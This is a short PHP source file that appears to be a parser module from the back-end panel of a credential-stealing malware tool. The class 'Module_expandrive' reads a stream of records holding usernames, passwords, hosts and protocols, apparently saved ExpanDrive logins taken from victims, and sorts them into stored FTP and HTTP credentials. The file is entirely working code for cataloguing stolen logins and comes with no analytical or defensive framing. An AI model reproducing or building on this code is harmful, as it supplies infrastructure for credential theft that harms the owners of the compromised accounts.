<?php
	class Module_expandrive extends Module_
	{
		public function process_module($Data, $Version)
		{
			switch ($Version)
			{
				case 0:
				
					$stream = new Stream($Data);
					while(TRUE)
					{
						$User = $stream->getSTRING_();
						
						if($User == NULL)
							break;

						$Pass = $stream->getSTRING_();
						$Host = $stream->getSTRING_();
						$Prot = $stream->getSTRING_();
						
						if ($Prot == 'ftp' || $Prot == 'sftp' || $Prot == 'ftps' )
							$this->add_ftp($this->ftp_force_ssh($Host, $Prot == "sftp"), $User, $Pass);
						else
							$this->add_http($Host, $User, $Pass);
					}
					$stream = NULL;
					
					break;
				default:
					return FALSE;
			}
			return TRUE;
		}
	}